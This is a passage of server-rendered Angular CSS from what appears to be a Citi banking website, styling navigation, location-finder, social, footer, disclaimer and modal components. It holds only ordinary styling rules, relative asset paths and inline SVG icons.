      display: block;
      width: 100%;
      padding-right: 0;
      padding-left: 0
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-input {
      display: contents
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-input .form-group {
      float: none;
      display: block;
      width: 100%
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-input label {
      color: #fff;
      display: none
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-input input {
      display: block;
      width: 140px;
      height: 36px
    }

    @media (max-width:990px) {
      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .badgeSection[_ngcontent-ssr-c115] .title[_ngcontent-ssr-c115] {
        padding: 10px 0 0 2px;
        position: relative
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115] {
        padding: 19px 0 24px
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] h3[_ngcontent-ssr-c115] {
        padding-bottom: 17px
      }

      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-input input {
        width: 100%
      }
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-input input[placeholder] {
      font-size: 12px;
      color: #666;
      letter-spacing: 0;
      line-height: 18px;
      font-family: Interstate_Regular;
      font-style: italic;
      padding-left: 10px
    }

    .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-cta button {
      min-width: auto;
      float: none;
      margin-bottom: 0;
      width: 140px;
      height: 36px;
      font-family: Interstate_Regular, sans-serif;
      font-size: 14px;
      color: #fff;
      letter-spacing: 0;
      text-align: center;
      line-height: 15px;
      margin-top: 8.1px;
      font-weight: 100
    }

    @media (max-width:990px) {
      .navigation[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] .location-finder[_ngcontent-ssr-c115]>.content[_ngcontent-ssr-c115] citi-form-container[_ngcontent-ssr-c115] form citi-cta button {
        width: 100%
      }
    }
  </style>
  <style>
    .social[_ngcontent-ssr-c118] {
      background: #333
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] {
      width: 100%;
      max-width: 1440px;
      margin: 0 auto;
      padding: 20px 6.667%;
      display: flex;
      justify-content: space-between
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .JDPowerDownloadText[_ngcontent-ssr-c118] {
      display: none
    }

    @media (max-width:990px) {
      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] {
        width: 100%;
        display: block;
        margin: 0 auto;
        padding-left: 5%;
        padding-right: 5%;
        padding-bottom: 12px
      }

      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .JDPowerDownloadText[_ngcontent-ssr-c118] {
        display: block;
        padding-top: 19px
      }

      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .JDPowerDownloadText[_ngcontent-ssr-c118] a[_ngcontent-ssr-c118] {
        font-size: 12px;
        color: #fff;
        width: 288px;
        height: 16px;
        -ms-grid-row-align: center;
        align-self: center
      }
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .registerMark[_ngcontent-ssr-c118] {
      font-size: 14px
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] {
      display: flex;
      padding-bottom: 10px
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] .JDPowerDownloadText[_ngcontent-ssr-c118] {
      display: none
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] {
      padding-right: 24px
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] button[_ngcontent-ssr-c118] {
      background: 0 0;
      border: none;
      padding: 0;
      cursor: pointer
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] .JDContainer[_ngcontent-ssr-c118] {
      display: flex
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] .JDContainer[_ngcontent-ssr-c118] button[_ngcontent-ssr-c118] {
      padding-right: 24px
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] .JDContainer[_ngcontent-ssr-c118] a[_ngcontent-ssr-c118] {
      font-size: 14px;
      color: #fff;
      width: 361px;
      height: 18px;
      -ms-grid-row-align: center;
      align-self: center
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118]:last-child {
      padding-right: 0
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .Appstore[_ngcontent-ssr-c118],
    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .Googleplay[_ngcontent-ssr-c118] {
      background-image: url(assets/img/Appstore-Googleplay-JDPower-Sprite.png);
      background-repeat: no-repeat;
      background-size: cover
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .facebook[_ngcontent-ssr-c118] {
      background-image: url(assets/img/social-media_facebook@3x.png);
      background-repeat: no-repeat;
      background-size: cover
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .twitter[_ngcontent-ssr-c118] {
      background-image: url(assets/img/social-media_twitter@3x.png);
      background-repeat: no-repeat;
      background-size: cover
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .Appstore[_ngcontent-ssr-c118] {
      width: 117px;
      height: 40.1px;
      background-position: 0 0
    }

    @media (max-width:990px) {
      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] .JDPowerDownloadText[_ngcontent-ssr-c118] {
        display: block;
        padding-top: 19px
      }

      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] .JDPowerDownloadText[_ngcontent-ssr-c118] a[_ngcontent-ssr-c118] {
        font-size: 12px;
        color: #fff;
        width: 288px;
        height: 16px;
        -ms-grid-row-align: center;
        align-self: center
      }

      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] {
        padding-right: 15px
      }

      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .socialItems[_ngcontent-ssr-c118] div[_ngcontent-ssr-c118] .JDContainer[_ngcontent-ssr-c118] a[_ngcontent-ssr-c118] {
        display: none
      }

      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .Appstore[_ngcontent-ssr-c118] {
        width: 102px;
        height: 36px
      }
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .Googleplay[_ngcontent-ssr-c118] {
      width: 130px;
      height: 40.1px;
      background-position: 0 -45px
    }

    @media (max-width:990px) {
      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .Googleplay[_ngcontent-ssr-c118] {
        width: 117px;
        height: 36px;
        background-position: 0 -41px
      }
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .JDPowerLogo[_ngcontent-ssr-c118] {
      width: 40px;
      height: 40.1px
    }

    @media (max-width:990px) {
      .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .JDPowerLogo[_ngcontent-ssr-c118] {
        width: 35.6px;
        height: 36px;
        margin-right: 0
      }
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .facebook[_ngcontent-ssr-c118] {
      width: 9px;
      height: 16px
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .twitter[_ngcontent-ssr-c118] {
      width: 22px;
      height: 16px
    }

    .social[_ngcontent-ssr-c118] .content[_ngcontent-ssr-c118] .youtube[_ngcontent-ssr-c118] {
      background-image: url(assets/img/social-media_youtube@3x.png);
      background-repeat: no-repeat;
      background-size: cover;
      width: 24px;
      height: 16px
    }
  </style>
  <style>
    .sub-navigation[_ngcontent-ssr-c116] {
      background-color: #333;
      font-size: 12px;
      margin: 0 auto 24px;
      padding: 0 6.667%;
      max-width: 1440px
    }

    .sub-navigation[_ngcontent-ssr-c116] *[_ngcontent-ssr-c116] {
      margin: 0
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] {
      height: 68px;
      padding: 20px 0;
      border: 1px solid #666;
      border-width: 1px 0
    }

    .sub-navigation[_ngcontent-ssr-c116] .content.singleBorder[_ngcontent-ssr-c116] {
      border-width: 2px 0 0
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .copyright[_ngcontent-ssr-c116] {
      display: inline-block;
      margin-right: 20px;
      font-family: Interstate_Bold, sans-serif;
      font-size: 12px;
      color: #fff
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] {
      margin: 0;
      padding: 0;
      display: inline-block
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] {
      display: inline-block;
      margin-right: 20px
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] span.staticLinks[_ngcontent-ssr-c116] {
      font-size: 12px;
      color: #fff
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] a,
    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] button {
      color: #fff;
      font-size: 12px;
      text-decoration: none;
      margin-right: 0
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] a:hover,
    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] button:hover {
      text-decoration: underline
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116]:nth-last-child(2) {
      margin-right: 6px
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116]:nth-last-child(2) citi-cta[_ngcontent-ssr-c116] button:hover {
      text-decoration: none
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .feedback[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] button:hover {
      text-decoration: underline
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116] {
      display: inline-block
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]>.title[_ngcontent-ssr-c116],
    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]>citi-cta[_ngcontent-ssr-c116] {
      color: #fff;
      background-color: transparent
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]>.title[_ngcontent-ssr-c116] a[_ngcontent-ssr-c116],
    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]>.title[_ngcontent-ssr-c116] button[_ngcontent-ssr-c116],
    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]>citi-cta[_ngcontent-ssr-c116] a,
    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]>citi-cta[_ngcontent-ssr-c116] button {
      color: #fff
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116] citi-modal[_ngcontent-ssr-c116] label[_ngcontent-ssr-c116] {
      font-size: 12px;
      margin-top: 20px
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116] citi-modal[_ngcontent-ssr-c116] citi-dropdown .form-group {
      width: 100%;
      margin-bottom: 0
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] p.speedBumpCopy[_ngcontent-ssr-c116] {
      padding: 10px;
      font-weight: 400
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] span.selectCountry[_ngcontent-ssr-c116] {
      font-size: 12px;
      padding: 12px;
      top: 18px
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .feedback[_ngcontent-ssr-c116] {
      float: right;
      position: relative;
      top: 3px
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .feedback[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] button {
      background-color: transparent;
      border: none;
      color: #fff;
      padding: 0;
      margin: -20px;
      font-size: 12px;
      text-decoration: none
    }

    .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .feedback[_ngcontent-ssr-c116] citi-cta[_ngcontent-ssr-c116] button:after {
      content: " ";
      padding-left: 15px;
      margin-left: 5px;
      background-size: 83% 80%;
      background-position-y: 2px
    }

    @media (max-width:990px) {
      .sub-navigation[_ngcontent-ssr-c116] {
        padding: 0 5%
      }

      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] {
        height: auto;
        clear: left
      }

      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .copyright[_ngcontent-ssr-c116],
      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116],
      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .feedback[_ngcontent-ssr-c116],
      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116] {
        float: none;
        display: block;
        margin: 0 0 10px
      }

      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .copyright[_ngcontent-ssr-c116]:last-child,
      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .country-selector[_ngcontent-ssr-c116]:last-child,
      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] .feedback[_ngcontent-ssr-c116]:last-child,
      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116] ul[_ngcontent-ssr-c116]:last-child {
        margin-bottom: 0
      }

      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116]>ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116] {
        display: block;
        margin-bottom: 5px
      }

      .sub-navigation[_ngcontent-ssr-c116] .content[_ngcontent-ssr-c116]>ul[_ngcontent-ssr-c116] li[_ngcontent-ssr-c116]:last-child {
        margin-bottom: 0
      }
    }

    citi-modal[_ngcontent-ssr-c116] .modal-dialog {
      margin: 40px auto !important
    }
  </style>
  <style>
    .disclaimer[_ngcontent-ssr-c117] {
      background: #333;
      padding-bottom: 12px
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] {
      width: 100%;
      max-width: 1440px;
      margin: 0 auto;
      padding: 0 6.667%
    }

    @media (max-width:990px) {
      .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] {
        padding: 0 5%
      }
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] h4 {
      font-family: Interstate_Bold, sans-serif;
      font-size: 12px;
      color: #fff;
      line-height: 16px
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] a,
    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] p {
      font-family: Interstate_Light, sans-serif;
      font-size: 12px;
      color: #f4f4f4;
      letter-spacing: 0;
      line-height: 18px
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] .text[_ngcontent-ssr-c117] {
      font-size: 12px;
      color: #fff
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] .text[_ngcontent-ssr-c117] p[_ngcontent-ssr-c117] {
      max-height: 100%
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] .text[_ngcontent-ssr-c117] p[_ngcontent-ssr-c117]:last-child {
      margin-bottom: 0
    }

    .disclaimer[_ngcontent-ssr-c117] .content[_ngcontent-ssr-c117] .text[_ngcontent-ssr-c117] a[_ngcontent-ssr-c117] {
      color: #fff
    }
  </style>
  <style>
    .sub-footer[_ngcontent-ssr-c119] {
      background: #333
    }

    @media (max-width:480px) {
      .sub-footer[_ngcontent-ssr-c119] .imgBottomCitiLogo_Mobile[_ngcontent-ssr-c119] {
        display: block;
        width: 100%
      }

      .sub-footer[_ngcontent-ssr-c119] .imgBottomCitiLogo_Desktop[_ngcontent-ssr-c119] {
        display: none
      }
    }

    @media screen and (min-width:481px) {
      .sub-footer[_ngcontent-ssr-c119] .imgBottomCitiLogo_Mobile[_ngcontent-ssr-c119] {
        display: none
      }

      .sub-footer[_ngcontent-ssr-c119] .imgBottomCitiLogo_Desktop[_ngcontent-ssr-c119] {
        display: block;
        width: 100%
      }
    }

    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] {
      color: #fff;
      font-size: 12px;
      width: 100%;
      max-width: 1440px;
      margin: 0 auto;
      padding: 20px
    }

    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] {
      float: right
    }

    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] .equalHousing[_ngcontent-ssr-c119],
    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] .fdic[_ngcontent-ssr-c119] {
      cursor: default !important;
      background-size: 70px;
      height: 30px;
      margin-right: 15px
    }

    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] .equalHousing[_ngcontent-ssr-c119]:last-child,
    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] .fdic[_ngcontent-ssr-c119]:last-child {
      margin-right: 0
    }

    @media (max-width:990px) {
      .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] {
        padding: 42px 5% 0
      }
    }

    .sub-footer[_ngcontent-ssr-c119] .content[_ngcontent-ssr-c119] .images[_ngcontent-ssr-c119] #cbol-footer-server[_ngcontent-ssr-c119] {
      display: inherit;
      float: left
    }
  </style>
  <style>
    a[_ngcontent-ssr-c58],
    abbr[_ngcontent-ssr-c58],
    acronym[_ngcontent-ssr-c58],
    address[_ngcontent-ssr-c58],
    applet[_ngcontent-ssr-c58],
    article[_ngcontent-ssr-c58],
    aside[_ngcontent-ssr-c58],
    audio[_ngcontent-ssr-c58],
    b[_ngcontent-ssr-c58],
    big[_ngcontent-ssr-c58],
    blockquote[_ngcontent-ssr-c58],
    body[_ngcontent-ssr-c58],
    canvas[_ngcontent-ssr-c58],
    caption[_ngcontent-ssr-c58],
    center[_ngcontent-ssr-c58],
    cite[_ngcontent-ssr-c58],
    code[_ngcontent-ssr-c58],
    dd[_ngcontent-ssr-c58],
    del[_ngcontent-ssr-c58],
    details[_ngcontent-ssr-c58],
    dfn[_ngcontent-ssr-c58],
    div[_ngcontent-ssr-c58],
    dl[_ngcontent-ssr-c58],
    dt[_ngcontent-ssr-c58],
    em[_ngcontent-ssr-c58],
    embed[_ngcontent-ssr-c58],
    fieldset[_ngcontent-ssr-c58],
    figcaption[_ngcontent-ssr-c58],
    figure[_ngcontent-ssr-c58],
    footer[_ngcontent-ssr-c58],
    form[_ngcontent-ssr-c58],
    h1[_ngcontent-ssr-c58],
    h2[_ngcontent-ssr-c58],
    h3[_ngcontent-ssr-c58],
    h4[_ngcontent-ssr-c58],
    h5[_ngcontent-ssr-c58],
    h6[_ngcontent-ssr-c58],
    header[_ngcontent-ssr-c58],
    hgroup[_ngcontent-ssr-c58],
    html[_ngcontent-ssr-c58],
    i[_ngcontent-ssr-c58],
    iframe[_ngcontent-ssr-c58],
    img[_ngcontent-ssr-c58],
    ins[_ngcontent-ssr-c58],
    kbd[_ngcontent-ssr-c58],
    label[_ngcontent-ssr-c58],
    legend[_ngcontent-ssr-c58],
    li[_ngcontent-ssr-c58],
    mark[_ngcontent-ssr-c58],
    menu[_ngcontent-ssr-c58],
    nav[_ngcontent-ssr-c58],
    object[_ngcontent-ssr-c58],
    ol[_ngcontent-ssr-c58],
    output[_ngcontent-ssr-c58],
    p[_ngcontent-ssr-c58],
    pre[_ngcontent-ssr-c58],
    q[_ngcontent-ssr-c58],
    ruby[_ngcontent-ssr-c58],
    s[_ngcontent-ssr-c58],
    samp[_ngcontent-ssr-c58],
    section[_ngcontent-ssr-c58],
    small[_ngcontent-ssr-c58],
    span[_ngcontent-ssr-c58],
    strike[_ngcontent-ssr-c58],
    strong[_ngcontent-ssr-c58],
    sub[_ngcontent-ssr-c58],
    summary[_ngcontent-ssr-c58],
    sup[_ngcontent-ssr-c58],
    table[_ngcontent-ssr-c58],
    tbody[_ngcontent-ssr-c58],
    td[_ngcontent-ssr-c58],
    tfoot[_ngcontent-ssr-c58],
    th[_ngcontent-ssr-c58],
    thead[_ngcontent-ssr-c58],
    time[_ngcontent-ssr-c58],
    tr[_ngcontent-ssr-c58],
    tt[_ngcontent-ssr-c58],
    u[_ngcontent-ssr-c58],
    ul[_ngcontent-ssr-c58],
    var[_ngcontent-ssr-c58],
    video[_ngcontent-ssr-c58] {
      margin: 0;
      padding: 0;
      border: 0;
      font: inherit;
      vertical-align: baseline
    }

    article[_ngcontent-ssr-c58],
    aside[_ngcontent-ssr-c58],
    details[_ngcontent-ssr-c58],
    figcaption[_ngcontent-ssr-c58],
    figure[_ngcontent-ssr-c58],
    footer[_ngcontent-ssr-c58],
    header[_ngcontent-ssr-c58],
    hgroup[_ngcontent-ssr-c58],
    menu[_ngcontent-ssr-c58],
    nav[_ngcontent-ssr-c58],
    section[_ngcontent-ssr-c58] {
      display: block
    }

    body[_ngcontent-ssr-c58] {
      line-height: 1
    }

    ol[_ngcontent-ssr-c58],
    ul[_ngcontent-ssr-c58] {
      list-style: none
    }

    blockquote[_ngcontent-ssr-c58],
    q[_ngcontent-ssr-c58] {
      quotes: none
    }

    blockquote[_ngcontent-ssr-c58]:after,
    blockquote[_ngcontent-ssr-c58]:before,
    q[_ngcontent-ssr-c58]:after,
    q[_ngcontent-ssr-c58]:before {
      content: "";
      content: none
    }

    table[_ngcontent-ssr-c58] {
      border-collapse: collapse;
      border-spacing: 0
    }

    .citi-modal-backdrop[_ngcontent-ssr-c58] {
      z-index: 9999
    }

    .citi-modal[_ngcontent-ssr-c58] {
      z-index: 10000
    }

    .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] {
      width: 55%;
      max-width: 1200px
    }

    @media (max-width:480px) {
      .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] {
        width: 100%;
        max-height: 100%;
        overflow: auto
      }

      .citi-modal[_ngcontent-ssr-c58] .modal-footer[_ngcontent-ssr-c58] .btn {
        width: 100%
      }
    }

    @media (min-width:480px) {
      .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] {
        width: 100%
      }

      .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] .modal-footer[_ngcontent-ssr-c58] citi-cta[_ngcontent-ssr-c58] {
        display: inline-block
      }

      .citi-modal[_ngcontent-ssr-c58] .modal-footer[_ngcontent-ssr-c58] .btn {
        width: auto
      }
    }

    @media (min-width:768px) {
      .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] {
        width: 65%
      }
    }

    @media (min-width:1200px) {
      .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] {
        width: 60%
      }
    }

    @media (min-width:1440px) {
      .citi-modal[_ngcontent-ssr-c58] .modal-dialog[_ngcontent-ssr-c58] {
        width: 55%
      }
    }

    .citi-modal.scrollable[_ngcontent-ssr-c58] .modal-body[_ngcontent-ssr-c58] {
      max-height: 360px;
      overflow-x: hidden;
      overflow-y: auto
    }

    .citi-modal[_ngcontent-ssr-c58] button.close-button[_ngcontent-ssr-c58] {
      padding: 0;
      border: 0;
      width: 15px;
      height: 15px;
      margin-top: 4px;
      margin-right: 4px;
      background-repeat: no-repeat;
      background-color: transparent;
      -webkit-appearance: none;
      opacity: 1;
      float: right;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 11 11'%3E%3Ctitle%3E06-close-white%3C/title%3E%3Cpath d='M21.41,20l3.8-3.79a1,1,0,0,0-1.42-1.42L20,18.59l-3.79-3.8a1,1,0,0,0-1.42,1.42L18.59,20l-3.8,3.79a1,1,0,0,0,0,1.42,1,1,0,0,0,1.42,0L20,21.41l3.79,3.8a1,1,0,0,0,1.42,0,1,1,0,0,0,0-1.42Z' transform='translate(-14.5 -14.5)' style='fill:%23666;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .citi-modal[_ngcontent-ssr-c58] button.close-button[_ngcontent-ssr-c58]:focus,
    .citi-modal[_ngcontent-ssr-c58] button.close-button[_ngcontent-ssr-c58]:hover {
      opacity: 1;
      margin-top: 0;
      margin-right: 0;
      height: 25px;
      width: 25px;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 22 22'%3E%3Ctitle%3E06-close-white-hover%3C/title%3E%3Cpath d='M21.41,20.15l3.8-3.79a1,1,0,0,0,0-1.41,1,1,0,0,0-1.42,0L20,18.74,16.21,15a1,1,0,0,0-1.42,0,1,1,0,0,0,0,1.41l3.8,3.79L14.79,24a1,1,0,0,0,0,1.41,1,1,0,0,0,1.42,0L20,21.57l3.79,3.79a1,1,0,0,0,1.42,0,1,1,0,0,0,0-1.41ZM20,9A11,11,0,1,0,31,20,11,11,0,0,0,20,9' transform='translate(-9 -9)' style='fill:%23666;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .modal.in[_ngcontent-ssr-c58] {
      overflow-x: hidden;
      overflow-y: auto
    }

    .botPadding[_ngcontent-ssr-c58] {
      padding-bottom: 20px !important
    }

    .marginBetweenBtns[_ngcontent-ssr-c58] {
      margin-left: 20px
    }

    @media (max-width:480px) {
      .marginBetweenBtns[_ngcontent-ssr-c58] {
        margin-left: 0
      }
    }

    .header[_ngcontent-ssr-c58] {
      display: block;
      box-sizing: border-box;
      margin-top: 0;
      margin-bottom: 20px;
      font-family: Interstate_Light, sans-serif;
      font-size: 42px;
      font-weight: 200;
      line-height: 3.125rem;
      text-align: left;
      letter-spacing: normal
    }
  </style>
  <style>
    .jamp.white[_ngcontent-ssr-c56] .img[_ngcontent-ssr-c56] {
      background-image: url(cbol-pre-login-static-assets/commonui-assets/images/jamp-spinner-white-2x.gif)
    }

    .jamp.white[_ngcontent-ssr-c56] .message[_ngcontent-ssr-c56] {
      color: #fff
    }

    .jamp[_ngcontent-ssr-c56] .img[_ngcontent-ssr-c56] {
      background-image: url(cbol-pre-login-static-assets/commonui-assets/images/jamp-spinner-2x.gif);
      background-position: 0 0;
      background-repeat: no-repeat;
      background-size: contain;
      padding-top: 5px;
      margin-right: 3px;
      width: 30px;
      height: 30px;
      display: inline-block
    }

    .jamp[_ngcontent-ssr-c56] .message[_ngcontent-ssr-c56] {
      position: relative;
      top: -9px
    }

    .jamp.jamp-css[_ngcontent-ssr-c56] .loading[_ngcontent-ssr-c56] {
